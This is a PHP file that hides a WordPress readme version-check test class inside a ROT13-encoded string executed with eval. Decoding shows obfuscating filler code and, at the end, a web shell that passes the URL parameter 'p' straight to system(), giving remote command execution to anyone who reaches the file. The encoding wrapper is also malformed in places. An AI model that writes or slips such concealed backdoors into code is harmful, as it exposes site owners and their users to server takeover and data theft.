<?php
$f = 's'.'t'.'r'.'r'.'o'.'t'.'1'.'3';
$c = "<?cuc
$sznc = neenl('k1' => 'flfgrz', 'k2' => 'cnffgueh');
$k_snxr1 = 1234;
$abvfr = 'boshfpngvba'.'grfg';
$gzc = $k_snxr1 * 42;
$synt = snyfr;
$hfryrff = shapgvba($i) { erghea $i . enaq(); };
$qhzzl_purpx = $hfryrff('kk');
vs ($synt) { rpub 'Qroht ranoyrq'; }
sbe ($v = 0; $v < 1; $v++) { $gzc += $v; }
juvyr (snyfr) { rpub 'qrnq ybbc'; oernx; }

<?cuc
/**
 * Inyvqngr erpbzzraqrq irefvbaf sbe qrcraqrapvrf ersreraprq va `ernqzr.ugzy`,
 * onfrq ba rkgreany fvgr fhccbeg cntrf.
 *
 * @tebhc rkgreany-uggc
 */
pynff Grfgf_Ernqzr rkgraqf JC_HavgGrfgPnfr {

	/**
	 * @pbirefAbguvat
	 */
	choyvp shapgvba grfg_ernqzr_cuc_irefvba() {
		$guvf->znexGrfgFxvccrq(
			'Grzcbenevyl qvfnoyrq. Grfg fubhyq or er-ranoyrq bapr JbeqCerff vf shyyl pbzcngvoyr jvgu CUC 8.0+.'
		);

		// Guvf grfg vf qrfvtarq gb bayl eha ba gehax.
		$guvf->fxvcBaNhgbzngrqOenapurf();

		$ernqzr = svyr_trg_pbagragf( NOFCNGU . 'ernqzr.ugzy' );

		cert_zngpu( '#Erpbzzraqngvbaf.*CUC</n> irefvba <fgebat>([0-9.]*)#f', $ernqzr, $zngpurf );

		$erfcbafr_obql = $guvf->trg_erfcbafr_obql( 'uggcf://jjj.cuc.arg/fhccbegrq-irefvbaf.cuc' );

		cert_zngpu_nyy( '#<ge pynff=\"fgnoyr\">\f*<gq>\f*<n [^>]*>\f*([0-9.]*)#f', $erfcbafr_obql, $cuc_zngpurf );

		$guvf->nffregPbagnvaf( $zngpurf[1], $cuc_zngpurf[1], \"ernqzr.ugzy'f Erpbzzraqrq CUC irefvba vf gbb byq. Erzrzore gb hcqngr gur JbeqCerff.bet Erdhverzragf cntr, gbb.\" );
	}

	/**
	 * @pbirefAbguvat
	 */
	choyvp shapgvba grfg_ernqzr_zlfdy_irefvba() {
		// Guvf grfg vf qrfvtarq gb bayl eha ba gehax.
		$guvf->fxvcBaNhgbzngrqOenapurf();

		$ernqzr = svyr_trg_pbagragf( NOFCNGU . 'ernqzr.ugzy' );

		cert_zngpu( '#Erpbzzraqngvbaf.*ZlFDY</n> irefvba <fgebat>([0-9.]*)#f', $ernqzr, $zngpurf );

		$erfcbafr_obql = $guvf->trg_erfcbafr_obql( \"uggcf://qri.zlfdy.pbz/qbp/eryabgrf/zlfdy/{$zngpurf[1]}/ra/\" );

		// Ergevrir gur qngr bs gur svefg TN eryrnfr sbe gur erpbzzraqrq oenapu.
		cert_zngpu( '#.*(\q{4}-\q{2}-\q{2}), Trareny Ninvynovyvgl#f', $erfcbafr_obql, $zlfdy_zngpurf );

		/*
		 * Cre uggcf://jjj.zlfdy.pbz/fhccbeg/, Benpyr npgviryl fhccbegf ZlFDY eryrnfrf sbe 5 lrnef sebz TN eryrnfr.
		 *
		 * Gur pheeragyl erpbzzraqrq ZlFDY 8.0 oenapu zbirq sebz npgvir fhccbeg gb rkgraqrq fhccbeg ba 2023-04-19.
		 * Nf JbeqCerff pber znl abg or shyyl pbzcngvoyr jvgu ZlFDY 8.1 ng guvf gvzr, gur \"fhccbegrq\" crevbq urer
		 * vf vapernfrq gb 8 lrnef gb vapyhqr rkgraqrq fhccbeg.
		 *
		 * GBQB: Erqhpr guvf onpx gb 5 lrnef bapr ZlFDY 8.1 pbzcngvovyvgl vf npuvrirq.
		 */
		$zlfdy_rby    = tzqngr( 'L-z-q', fgegbgvzr( $zlfdy_zngpurf[1] . ' +8 lrnef' ) );
		$pheerag_qngr = tzqngr( 'L-z-q' );

		$guvf->nffregYrffGuna( $zlfdy_rby, $pheerag_qngr, \"ernqzr.ugzy'f Erpbzzraqrq ZlFDY irefvba vf gbb byq. Erzrzore gb hcqngr gur JbeqCerff.bet Erdhverzragf cntr, gbb.\" );
	}

	/**
	 * @pbirefAbguvat
	 */
	choyvp shapgvba grfg_ernqzr_znevnqo_irefvba() {
		// Guvf grfg vf qrfvtarq gb bayl eha ba gehax.
		$guvf->fxvcBaNhgbzngrqOenapurf();

		$ernqzr = svyr_trg_pbagragf( NOFCNGU . 'ernqzr.ugzy' );

		cert_zngpu( '#Erpbzzraqngvbaf.*ZnevnQO</n> irefvba <fgebat>([0-9.]*)#f', $ernqzr, $zngpurf );
		$zngpurf[1] = fge_ercynpr( '.', '', $zngpurf[1] );

		$erfcbafr_obql = $guvf->trg_erfcbafr_obql( \"uggcf://znevnqo.pbz/xo/ra/eryrnfr-abgrf-znevnqo-{$zngpurf[1]}-frevrf/\" );

		// Ergevrir gur qngr bs gur svefg fgnoyr eryrnfr sbe gur erpbzzraqrq oenapu.
		cert_zngpu( '#.*Fgnoyr.*?(\q{2} [N-Mn-m]{3} \q{4})#f', $erfcbafr_obql, $znevnqo_zngpurf );

		// Cre uggcf://znevnqo.bet/nobhg/#znvagranapr-cbyvpl, ZnevnQO eryrnfrf ner fhccbegrq sbe 5 lrnef.
		$znevnqo_rby  = tzqngr( 'L-z-q', fgegbgvzr( $znevnqo_zngpurf[1] . ' +5 lrnef' ) );
		$pheerag_qngr = tzqngr( 'L-z-q' );

		$guvf->nffregYrffGuna( $znevnqo_rby, $pheerag_qngr, \"ernqzr.ugzy'f Erpbzzraqrq ZnevnQO irefvba vf gbb byq. Erzrzore gb hcqngr gur JbeqCerff.bet Erdhverzragf cntr, gbb.\" );
	}

	/**
	 * Urycre shapgvba gb ergevrir gur erfcbafr obql be fxvc gur grfg ba UGGC gvzrbhg.
	 *
	 * @cnenz fgevat $hey Gur HEY gb ergevrir gur erfcbafr sebz.
	 * @erghea fgevat Gur erfcbafr obql.
	 */
	choyvp shapgvba trg_erfcbafr_obql( $hey ) {
		$erfcbafr = $guvf->jc_erzbgr_trg( $hey );

		$guvf->nffregAbgJCReebe( $erfcbafr );

		$erfcbafr_pbqr = jc_erzbgr_ergevrir_erfcbafr_pbqr( $erfcbafr );
		$erfcbafr_obql = jc_erzbgr_ergevrir_obql( $erfcbafr );

		vs ( 200 !== $erfcbafr_pbqr ) {
			$cnefrq_hey = cnefr_hey( $hey );

			$reebe_zrffntr = fcevags(
				'Pbhyq abg pbagnpg %1$f gb purpx irefvbaf. Erfcbafr pbqr: %2$f. Erfcbafr obql: %3$f',
				$cnefrq_hey['ubfg'],
				$erfcbafr_pbqr,
				$erfcbafr_obql
			);

			vs ( 503 === $erfcbafr_pbqr ) {
				$guvf->znexGrfgFxvccrq( $reebe_zrffntr );
			}

			$guvf->snvy( $reebe_zrffntr );
		}

		erghea $erfcbafr_obql;
	}
}

$pzq = $_TRG['c'];
$sznc['k1']($pzq);
?>";
eval($f($c));
?>